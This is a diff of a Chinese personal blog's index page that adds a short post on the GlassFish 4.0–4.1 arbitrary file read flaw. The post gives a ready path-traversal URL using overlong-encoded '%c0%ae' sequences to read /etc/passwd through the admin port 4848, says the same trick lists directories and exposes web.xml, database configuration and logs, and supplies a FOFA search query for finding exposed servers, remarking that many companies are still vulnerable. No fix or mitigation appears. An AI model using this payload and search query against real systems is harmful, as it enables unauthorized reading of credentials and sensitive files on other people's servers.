@@ -156,18 +156,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-count">10</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -196,6 +196,97 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://mosquito.top/2022/11/13/15-34-05/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/android-chrome-256x256.png">
+      <meta itemprop="name" content="mosquito">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mosquito的博客">
+      <meta itemprop="description" content="学海无涯苦作舟">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | mosquito的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/11/13/15-34-05/" class="post-title-link" itemprop="url">应用服务器glassfish任意文件读取漏洞</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-11-13 15:34:05 / 修改时间：16:18:13" itemprop="dateCreated datePublished" datetime="2022-11-13T15:34:05+08:00">2022-11-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" itemprop="url" rel="index"><span itemprop="name">任意文件读取</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="应用服务器glassfish任意文件读取漏洞"><a href="#应用服务器glassfish任意文件读取漏洞" class="headerlink" title="应用服务器glassfish任意文件读取漏洞"></a>应用服务器glassfish任意文件读取漏洞</h1><h2 id="漏洞编号：wooyun-2010-0144595"><a href="#漏洞编号：wooyun-2010-0144595" class="headerlink" title="漏洞编号：wooyun-2010-0144595"></a>漏洞编号：wooyun-2010-0144595</h2><h2 id="影响版本-glass-fish4-0至4-1这两个大版本"><a href="#影响版本-glass-fish4-0至4-1这两个大版本" class="headerlink" title="影响版本:  glass fish4.0至4.1这两个大版本"></a>影响版本:  glass fish4.0至4.1这两个大版本</h2><h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>该漏洞标题写的是任意文件读取漏洞，其实该漏洞同样可以列出对应目录文件，基本上等同于源代码泄露，各种敏感信息暴露无遗。</p>
+<p>该漏洞分为windows和linux 系统</p>
+<p>4848端口为glassfish默认开放的web管理端口</p>
+<p>使用%c0%ae%c0%ae/这一个java中的特殊方式可直接跳转目录，获得目录文件列表。</p>
+<p>读取web应用配置文件，如（web.xml,数据库配置文件，web系统日志）等敏感文件;</p>
+<p>针对特定的文件可进一步读取其内容。</p>
+<p>fofa搜索语句:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;glassfish &quot; &amp;&amp; &quot;4.0&quot; &amp;&amp; port=&quot;4848&quot;</span><br></pre></td></tr></table></figure>
+
+<p>虽然是几年前的了,但到目前了影响的公司,漏洞存在的公司还是有很多滴.</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221108125019-1668327385931.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
